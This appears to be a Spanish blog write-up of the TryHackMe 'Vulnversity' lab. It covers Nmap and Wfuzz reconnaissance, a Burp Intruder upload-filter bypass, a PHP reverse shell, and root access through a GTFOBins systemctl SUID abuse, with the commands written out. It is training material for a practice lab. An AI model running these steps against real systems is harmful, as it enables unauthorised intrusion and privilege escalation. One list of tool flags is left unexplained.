I"P<p>El día de hoy vamos a resolver la máquina <em>Vulnversity</em> de <em>TryHackMe</em>. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/1.png" alt="" /></p>

<h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>

<p>Primeramente vamos a utilizar la herramienta <em>Nmap</em> para determinar que puertos están abiertos así como identificar la versión y servicios que corren en el activo. Es importante aclarar que así como menciona la plataforma de <em>TryHackMe</em>, existen diversos <a href="https://www.stationx.net/nmap-cheat-sheet/">cheatsheets</a> que podemos encontrar en internet, cuyo principal objetivo es darnos a conocer cuales son todas las posiblidades que nos ofrece la herramienta.</p>

<p>No obstante, recordemos que varias herramientas por defecto tienen incluidas un <code class="language-plaintext highlighter-rouge">manual</code> o vienen con un comando <code class="language-plaintext highlighter-rouge">--help</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man nmap
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --help
</code></pre></div></div>

<p>Entre las preguntas que nos realiza la plataforma en esta primera fase, se encuentra:</p>

<ul>
  <li>¿Cuántos puertos abiertos existen?</li>
  <li>¿Qué sistema operativo tiene la máquina ante la que nos estamos enfrentando?</li>
  <li>¿En qué puerto está corriendo el servidor web?</li>
  <li>¿Qué versión de squid proxy está corriendo en la máquina?</li>
</ul>

<p>Todas estas preguntas son fáciles de responder si realizamos un buen escaneo con <em>Nmap</em>.</p>

<p>Para determinar que puertos están abiertos podemos realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p- --open -T5 -v -n &lt;dirección IP&gt; -oG allPorts
</code></pre></div></div>

<p>Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn &lt;dirección IP&gt; -oG allPorts
</code></pre></div></div>

<p>A continuación se explican los parámetros utilizados en el escaneo de puertos con <em>Nmap</em>:</p>

<ul>
  <li>p - Escanea todo el rango de puertos (65535 en total)</li>
  <li>open - Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)</li>
  <li>T5 - La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido  “, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos <code class="language-plaintext highlighter-rouge">White Hat</code></li>
  <li>v - <em>Verbose</em>, reporta lo encontrado por consola</li>
  <li>n - No aplicar <em>resolución DNS</em></li>
  <li>sS - Escaneo <em>TCP SYN</em></li>
  <li>min-rate - Emitir paquetes no más lentos que -valor- por segundo</li>
  <li>vvv - Triple <em>verbose</em>, para obtener mayor información por consola</li>
  <li>Pn - No aplicar <em>host discovery</em></li>
  <li>oG - Exportar el escaneo en formato “<em>grepeable</em>”</li>
</ul>

<p>Para determinar la versión y servicios que corren bajo estos puertos podemos realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV -p 21,22,139,445,3128,3333 &lt;dirección IP&gt; -oN targeted
</code></pre></div></div>

<p>A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con <em>Nmap</em>:</p>

<ul>
  <li>sC - Scripts básicos de enumeración</li>
  <li>sV - Versión y servicios que corren bajo los puertos encontrados</li>
  <li>p - Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)</li>
  <li>oN - Exportar el escaneo en formato <em>Nmap</em></li>
</ul>

<p>Con estos dos escaneos bastará para responder a las preguntas planteadas con anterioridad, sin embargo nos quedan dos preguntas más, las cuales son:</p>

<ul>
  <li>¿Cuántos puertos se escanearán si utilizamos el parámetro -p-400?</li>
  <li>Utilizando el parámetro -n, ¿qué no se está resolviendo?</li>
</ul>

<p>Para responder a estas dos preguntas bastará con haber leído el <code class="language-plaintext highlighter-rouge">manual</code> de <em>Nmap</em>, o bien, haber utilizado su parámetro <code class="language-plaintext highlighter-rouge">--help</code>. En este caso, si colocamos un número después de <code class="language-plaintext highlighter-rouge">-p-</code>, se escaneará tantos puertos hayamos indicado; y en el caso del parámetro <code class="language-plaintext highlighter-rouge">-n</code>, no se aplicará resolución DNS.</p>

<p>Una vez hemos determinado que puertos están abiertos, así como identificado la versión y servicios que corren en el activo, otro paso importante dentro de la fase de reconocimiento, es el <em>fuzzing</em>; cabe aclarar que este solo se realiza cuando la máquina víctima está corriendo un servidor web.</p>

<p><em>TryHackMe</em> nos recomienda utilizar <em>GoBuster</em>, sin embargo, prefiero personalmente el uso de <em>Wfuzz</em>; en caso de no contar con esta herramienta instalada, bastará con realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install wfuzz
</code></pre></div></div>

<p>Para pasar a la fase de explotación, lo que nos solicita la plataforma es encontrar una ruta potencial de la página web, que nos permita una subida de archivos, para lo cual debemos de <em>fuzzear</em> la página web, para ello realizaremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -L -t 400 --hc 404 --hh 33014 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://dirección IP:3333/FUZZ 2&gt; /dev/null
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/2.png" alt="" /></p>

<p>A continuación se explican los parámetros utilizados en el <em>fuzzeo</em> del servidor web:</p>

<ul>
  <li>c -</li>
  <li>L -</li>
  <li>t -</li>
  <li>hc -</li>
  <li>hh -</li>
  <li>w -</li>
</ul>

<p>Como podemos observar, existen cinco direcciones a las cuales podemos acceder, sin embargo, solamente una de ellas llama nuestra atención, la dirección <code class="language-plaintext highlighter-rouge">internal</code>, ya que en <em>images</em>, <em>css</em>, <em>js</em> y <em>fonts</em> parece ser donde está alojado el contenido de la página web. Y en efecto, al entrar en la dirección <code class="language-plaintext highlighter-rouge">internal</code>, podemos observar que tenemos un panel que nos permite realizar una subida de archivos, con la cual nos entablaremos una <em>reverse shell</em>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/3.png" alt="" /></p>

<h3 id="fase-de-explotación"><a href="#header-3"></a>Fase De Explotación</h3>

<p>Al encontrarnos una ruta potencial que nos permite una subida de archivos, lo primero que vamos a intentar es entablarnos una <em>reverse shell</em>; podemos descargar una <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">aquí</a>. Una vez la hayamos descargado, tenemos que modificar el valor de <code class="language-plaintext highlighter-rouge">ip</code> (colocamos la nuestra), y si queremos, podemos también modificar el valor del <em>puerto</em>, aunque esto es completamente opcional.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/4.png" alt="" /></p>

<p>Sin embargo, cuando intentamos subir nuestra <em>reverse shell</em>, nos aparecerá un mensaje indicándonos que la extensión de nuestro archivo no es permitida.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/5.png" alt="" /></p>

<p>Por lo que tendremos que buscar una extensión que no nos de problema alguno. Si realizaramos este proceso de forma manual, sería algo bastante tedioso, por lo que vamos a utilizar <em>Burp Suite</em> para poder realizar una ataque de tipo <em>Sniper</em>.</p>

<p>Para ello, vamos a empezar por volver a subir nuestra <em>reverse shell</em>, pero ahora tramitando todas las peticiones a través de <em>Burp Suite</em>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/6.png" alt="" /></p>

<p>Posterior a ello presionaremos <code class="language-plaintext highlighter-rouge">Ctrl + I</code> para enviar esta petición al <em>Intruder</em>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/7.png" alt="" /></p>

<p>Ahora, en el apartado <em>Positions</em>, en el tipo de ataque elegiremos la opción de <em>Sniper</em>, después seleccionaremos la opción <code class="language-plaintext highlighter-rouge">Clear §</code>, para posteriormente con nuestro cursor <code class="language-plaintext highlighter-rouge">resaltaremos</code> la zona en la que se encuentra la extensión del archivo que subimos, para finalmente presionar la opción <code class="language-plaintext highlighter-rouge">Add §</code>; esto se vería algo así:</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/8.png" alt="" /></p>

<p>Posteriormente, procederemos a crear un pequeño diccionario con las extensiones más comunes de <em>PHP</em>:</p>

<ul>
  <li>.php</li>
  <li>.phtml</li>
  <li>.php3</li>
  <li>.php4</li>
  <li>.php5</li>
  <li>.php7</li>
  <li>.phps</li>
  <li>.php-s</li>
  <li>.pht</li>
  <li>.phar</li>
</ul>

<p>Una vez, hemos creado nuestro diccionario, en el apartado <em>Payloads</em>, en la opción <em>Sample List</em> cargaremos este diccionario; en este mismo apartado, en el final, encontraremos una opción que codifica ciertos caracteres especiales, esta opción la desactivaremos.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/9.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/10.png" alt="" /></p>

<p>Finalmente, presionaremos el botón de iniciar ataque, e inmediatamente aparecerá una nueva ventana mostrándonos los resultados obtenidos, o bien, aquello que todavía está probando. Podríamos revisar una a una las respuestas del lado del servidor, pero si nos percatamos, aunque todas las respuestas tengan el mismo código de estado <code class="language-plaintext highlighter-rouge">200</code>, la longitud de estas no es la misma para para todas las extensiones, la única extensión cuya longitud varía es <code class="language-plaintext highlighter-rouge">.phtml</code>; si quisieramos estar completamente seguros, podríamos revisar el <code class="language-plaintext highlighter-rouge">render</code> de la respuesta, el cual nos devuelve un <code class="language-plaintext highlighter-rouge">success</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/11.png" alt="" /></p>

<p>Con esta información, ya sabemos que tipo de archivo es válido para subir en la ruta <code class="language-plaintext highlighter-rouge">internal</code>, por lo que procederemos a cambiar la extensión de nuestro archivo y subirlo una última vez.</p>

<p>Una vez el archivo está subido, podemos ponernos en escucha por el puerto que hayamos establecido en nuestra <em>reverse shell</em> a través de <em>Netcat</em>. A partir de aquí podemos hacer dos cosas:</p>

<p>Podemos navegar a la dirección en la que está subido nuestro archivo (tal como lo indica la plataforma de <em>TryHackMe</em>), es decir, entrar a:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://&lt;dirección IP&gt;:3333/internal/uploads/nombreDeLaReverseShell.phtml
</code></pre></div></div>
<p>O por otra parte, y sin dejar la consola, utilizar el comando <em>curl</em>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://&lt;dirección IP&gt;:3333/internal/uploads/nombreDeLaReverseShell.phtml
</code></pre></div></div>

<p>Ambas opciones, nos conseguirán una <em>consola</em> dentro de la máquina víctima.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/12.png" alt="" /></p>

<p>Es importante aclarar que la <em>consola</em> que acabamos de conseguir, no es nada interactiva, esto quiere decir que si quisieramos limpiar la <em>consola</em> utilizando <code class="language-plaintext highlighter-rouge">Ctrl + L</code>, no pasará nada, así mismo si quisieramos desplazarnos utilizando las <code class="language-plaintext highlighter-rouge">flechas</code> del teclado, no nos será posible hacerlo, para ello deberemos de realizar el respectivo tratamiento de la <code class="language-plaintext highlighter-rouge">TTY</code>, para lo cual haremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null -c bash

Ctrl + Z

stty raw -echo; fg
reset
xterm

export TERM=xterm
export SHELL=bash

stty rows &lt;valor&gt; columns &lt;valor&gt;
</code></pre></div></div>

<p>Los valores que colocaremos en <code class="language-plaintext highlighter-rouge">&lt;valor&gt;</code> en el último comando, dependerán del tamaño de nuestra pantalla, por lo cual en una nueva terminal de nuestra máquina escribiremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stty -a
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/13.png" alt="" /></p>

<p>Continuando con las preguntas de la plataforma, nos pregunta ahora por el usuario que maneja el servidor web, así como su respectiva <code class="language-plaintext highlighter-rouge">flag</code>. Para realizar esto podríamos dirigirnos al directorio <code class="language-plaintext highlighter-rouge">/home</code>, y listar los directorios que existen.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/14.png" alt="" /></p>

<p>Aunque también podriamos filtrar del archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, a través de expresiones regulares, todos aquellos usuario que tengan una <em>shell</em>, sea esta una:</p>

<ul>
  <li>bash</li>
  <li>zsh</li>
  <li>sh</li>
  <li>csh</li>
  <li>ksh</li>
  <li>tcsh</li>
</ul>

<p>Esto sería bastante fácil, ya que todas, o casi todas las <em>shells</em> terminan en <code class="language-plaintext highlighter-rouge">sh</code>, de modo que:</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/15.png" alt="" /></p>

<p>Una vez hemos listado los usuarios del sistema, podemos pasar a buscar en que ruta se encuentra la <code class="language-plaintext highlighter-rouge">flag</code> del usuario con bajos privilegios, para ello podemos hacer lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find . -name user.txt 2&gt; /dev/null
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/16.png" alt="" /></p>

<h3 id="escalada-de-privilegios"><a href="#header-3"></a>Escalada De Privilegios</h3>

<p>Para realizar esta última fase, la misma plataforma de <em>TryHackMe</em> nos sugiere que nos aprovechemos de algún binario con permisos mal asignados, concretamente permisos <code class="language-plaintext highlighter-rouge">SUID</code>. Para listar todos aquellos binarios con permisos <code class="language-plaintext highlighter-rouge">SUID</code> asignados, tenemos varias opciones, no obstante, estas son las que yo utilizo:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -uid 0 -perm -4000 -type f 2&gt;/dev/null
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/17.png" alt="" /></p>

<p>Para aprovecharnos de algún binario, la mejor forma es recurrir a <a href="https://gtfobins.github.io/">GTFOBins</a>, esta página nos explica como aprovecharnos de binarios con <em>capabilities</em> mal asignadas, binarios que se pueden ejectuar como <em>root</em>, y en este caso binarios con permisos <em>SUID</em> mal asignados.</p>

<p>En este caso, el binario más extraño que nos encontramos es <code class="language-plaintext highlighter-rouge">/bin/systemctl</code>, ya que este comando lo que nos permite es controlar el sistema y sus servicios, por lo que procederemos a buscar en <code class="language-plaintext highlighter-rouge">GTFOBins</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/18.png" alt="" /></p>

<p>Como podemos ver, podemos abusar de este binario fácilmente, además de que nos permite ejecutar cualquier código malicioso que queramos, para conseguir la última <code class="language-plaintext highlighter-rouge">flag</code> haremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' &gt; $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
</code></pre></div></div>

<p>Lo único que modificamos de la información que nos provee <code class="language-plaintext highlighter-rouge">GTFOBins</code>, fue el código a ejecutar, en este caso, asignar un permiso <code class="language-plaintext highlighter-rouge">SUID</code> a la <code class="language-plaintext highlighter-rouge">/bin/bash</code>, para a través del parámetro <code class="language-plaintext highlighter-rouge">-p</code>, ejecutar el binario <code class="language-plaintext highlighter-rouge">/bin/bash</code> manteniendo permisos y privilegios del usuario al que le pertenece el binario, en este caso al usuario <em>Root</em>. Otro aspecto que se modificó fue utilizar el binario <code class="language-plaintext highlighter-rouge">/bin/systemctl</code> desde su ruta absoluta, mas no de su ruta relativa.</p>

<p>Una vez siendo <em>Root</em>, podemos pasar a buscar su respectiva flag, esto lo podemos hacer así:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find . -name root.txt
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/19.png" alt="" /></p>
:ET